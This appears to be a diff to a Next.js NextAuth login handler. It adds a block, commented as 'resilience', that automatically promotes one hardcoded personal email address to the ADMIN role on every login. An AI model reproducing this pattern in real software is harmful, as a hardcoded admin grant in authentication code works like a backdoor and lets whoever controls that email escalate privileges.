@@ -26,7 +26,7 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
 
-        const user = await prisma.user.findUnique({
+        let user = await prisma.user.findUnique({
           where: {
             email: credentials.email as string,
           },
@@ -43,6 +43,14 @@ export const authOptions: NextAuthOptions = {
 
         if (!isPasswordValid) {
           return null;
+        }
+
+        // Resiliência: Garante que o administrador oficial sempre tenha a role ADMIN
+        if (user.email === 'joaohelio396@gmail.com' && user.role !== 'ADMIN') {
+          user = await prisma.user.update({
+            where: { id: user.id },
+            data: { role: 'ADMIN' },
+          });
         }
 
         return {
